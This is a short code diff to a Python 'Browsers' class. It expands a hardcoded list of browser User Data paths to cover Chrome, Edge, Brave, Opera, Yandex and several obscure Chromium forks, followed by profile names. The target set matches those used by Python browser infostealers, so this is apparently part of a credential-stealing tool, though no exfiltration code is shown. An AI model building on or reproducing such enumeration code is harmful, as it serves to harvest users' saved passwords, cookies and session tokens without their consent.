@@ -17,8 +17,23 @@ class Browsers:
         self.browsers = {
             'kometa': self.appdata + '\\Kometa\\User Data',
             'orbitum': self.appdata + '\\Orbitum\\User Data',
-            # (Các trình duyệt khác)
+            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+            '7star': self.appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': self.appdata + '\\Iridium\\User Data',
+            'opera': self.roaming + '\\Opera Software\\Opera Stable',
+            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
+            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
         }
+        
         self.profiles = [
             'Default',
             'Profile 1',
